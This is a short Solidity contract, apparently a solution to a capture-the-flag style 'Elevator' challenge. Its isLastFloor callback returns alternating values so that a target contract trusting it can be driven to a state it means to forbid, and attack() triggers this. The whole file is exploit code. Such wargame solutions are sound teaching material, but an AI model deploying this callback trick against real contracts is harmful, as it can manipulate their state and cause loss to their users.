// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    address public elevatorAddress;
    bool public last = true;

    constructor(address _elevatorAddress) {
        elevatorAddress = _elevatorAddress;
    }

    function isLastFloor(uint256 _number) external returns (bool) {
        last = !last;
        return last;
    }

    function attack() external {
        IElevator(elevatorAddress).goTo(100);
    }
}
